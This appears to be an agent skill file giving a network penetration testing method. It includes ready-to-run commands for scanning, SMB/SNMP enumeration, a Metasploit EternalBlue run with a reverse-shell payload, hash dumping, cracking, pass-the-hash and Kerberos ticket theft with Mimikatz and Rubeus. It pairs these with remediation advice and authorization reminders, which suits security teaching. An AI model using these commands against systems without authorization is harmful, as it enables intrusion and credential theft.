---
name: network-penetration-testing
description: Professional techniques and methodology for network penetration testing
version: 1.0.0
---

# Network Penetration Testing

## Overview

Network penetration testing is a critical part of assessing network infrastructure security. This skill covers the methodology, tools, and best practices for network penetration testing.

## Testing Scope

### 1. Reconnaissance

**Checks:**
- Network topology
- Host discovery
- Port scanning
- Service detection

### 2. Vulnerability Scanning

**Checks:**
- System vulnerabilities
- Service vulnerabilities
- Misconfigurations
- Weak credentials

### 3. Exploitation

**Checks:**
- Remote code execution
- Privilege escalation
- Lateral movement
- Persistence

## Reconnaissance

### Network Scanning

**Using Nmap:**
```bash
# Host discovery
nmap -sn 192.168.1.0/24

# Port scanning
nmap -sS -p- 192.168.1.100

# Service detection
nmap -sV -sC 192.168.1.100

# OS detection
nmap -O 192.168.1.100

# Full scan
nmap -sS -sV -sC -O -p- 192.168.1.100
```

**Using Masscan:**
```bash
# Fast port scanning
masscan -p1-65535 192.168.1.0/24 --rate=1000
```

### Service Enumeration

**SMB enumeration:**
```bash
# Enumerate SMB shares
smbclient -L //192.168.1.100 -N

# Enumerate SMB users
enum4linux -U 192.168.1.100

# Using Nmap scripts
nmap --script smb-enum-shares,smb-enum-users 192.168.1.100
```

**RPC enumeration:**
```bash
# Enumerate RPC services
rpcclient -U "" -N 192.168.1.100

# Using Nmap scripts
nmap --script rpc-enum 192.168.1.100
```

**SNMP enumeration:**
```bash
# SNMP scan
snmpwalk -v2c -c public 192.168.1.100

# Using onesixtyone
onesixtyone -c wordlist.txt 192.168.1.0/24
```

## Vulnerability Scanning

### Using Nessus

```bash
# Start Nessus
# Access the web interface
# Create a scan
# Analyze scan results
```

### Using OpenVAS

```bash
# Start OpenVAS
gvm-setup

# Access the web interface
# Create a scan
# Analyze scan results
```

### Using Nmap Scripts

```bash
# Vulnerability scan
nmap --script vuln 192.168.1.100

# Scan for a specific vulnerability
nmap --script smb-vuln-ms17-010 192.168.1.100

# All scripts
nmap --script all 192.168.1.100
```

## Exploitation

### Metasploit

**Basic usage:**
```bash
# Start Metasploit
msfconsole

# Search for an exploit
search ms17-010

# Use a module
use exploit/windows/smb/ms17_010_eternalblue

# Set options
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.10
set LPORT 4444

# Run
exploit
```

**Post-exploitation:**
```bash
# Get system information
sysinfo

# Elevate privileges
getsystem

# Migrate process
migrate <pid>

# Dump hashes
hashdump

# Gather credentials
run post/windows/gather/smart_hashdump
```

### Common Exploits

**EternalBlue:**
```bash
# Using Metasploit
use exploit/windows/smb/ms17_010_eternalblue

# Using a standalone tool
python eternalblue.py 192.168.1.100
```

**BlueKeep:**
```bash
# Using Metasploit
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
```

**SMBGhost:**
```bash
# Using a standalone tool
python smbghost.py 192.168.1.100
```

## Lateral Movement

### Password Cracking

**Using Hashcat:**
```bash
# Crack NTLM hashes
hashcat -m 1000 hashes.txt wordlist.txt

# Crack LM hashes
hashcat -m 3000 hashes.txt wordlist.txt

# Using rules
hashcat -m 1000 hashes.txt wordlist.txt -r rules/best64.rule
```

**Using John:**
```bash
# Crack hashes
john hashes.txt

# Using a wordlist
john --wordlist=wordlist.txt hashes.txt

# Using rules
john --wordlist=wordlist.txt --rules hashes.txt
```

### Pass-the-Hash

**Using Impacket:**
```bash
# SMB Pass-the-Hash
python smbexec.py -hashes :<hash> domain/user@target

# WMI Pass-the-Hash
python wmiexec.py -hashes :<hash> domain/user@target

# RDP Pass-the-Hash
xfreerdp /u:user /pth:<hash> /v:target
```

### Pass-the-Ticket

**Using Mimikatz:**
```bash
# Extract tickets
sekurlsa::tickets /export

# Inject a ticket
kerberos::ptt ticket.kirbi
```

**Using Rubeus:**
```bash
# Request a ticket
Rubeus.exe asktgt /user:user /domain:domain /rc4:hash

# Inject a ticket
Rubeus.exe ptt /ticket:ticket.kirbi
```

## Tool Usage

### Nmap

```bash
# Full scan
nmap -sS -sV -sC -O -p- -T4 target

# Stealth scan
nmap -sS -T2 -f -D RND:10 target

# UDP scan
nmap -sU -p- target
```

### Metasploit

```bash
# Start the framework
msfconsole

# Initialize the database
msfdb init

# Import scan results
db_import nmap.xml

# List hosts
hosts

# List services
services
```

### Burp Suite

**Network scanning:**
1. Configure the proxy
2. Browse the target network
3. Analyze traffic
4. Run active scans

## Testing Checklist

### Reconnaissance
- [ ] Network topology discovery
- [ ] Host discovery
- [ ] Port scanning
- [ ] Service detection
- [ ] OS detection

### Vulnerability Scanning
- [ ] System vulnerability scan
- [ ] Service vulnerability scan
- [ ] Misconfiguration check
- [ ] Weak credential check

### Exploitation
- [ ] Remote code execution
- [ ] Privilege escalation
- [ ] Lateral movement
- [ ] Persistence

## Common Security Issues

### 1. Unpatched Systems

**Issue:**
- Systems not updated in time
- Known vulnerabilities present
- Poor patch management

**Remediation:**
- Apply patches promptly
- Establish a patch management process
- Apply security updates regularly

### 2. Weak Credentials

**Issue:**
- Default passwords
- Simple passwords
- Password reuse

**Remediation:**
- Enforce a strong password policy
- Enable multi-factor authentication
- Rotate passwords regularly

### 3. Open Ports

**Issue:**
- Unnecessary open ports
- Exposed services
- Firewall misconfiguration

**Remediation:**
- Close unnecessary ports
- Enforce firewall rules
- Restrict access via VPN

### 4. Misconfiguration

**Issue:**
- Default configurations
- Excessive privileges
- Improper service configuration

**Remediation:**
- Apply secure configuration baselines
- Follow the principle of least privilege
- Review configurations regularly

## Best Practices

### 1. Reconnaissance

- Scan thoroughly
- Cross-check with multiple tools
- Document findings
- Analyze results

### 2. Exploitation

- Test only with authorization
- Minimize impact
- Log all actions
- Clean up promptly

### 3. Reporting

- Document in detail
- Assign risk ratings
- Provide remediation advice
- Include verification steps

## Notes

- Test only in authorized environments
- Avoid impacting production systems
- Comply with laws and regulations
- Protect testing data
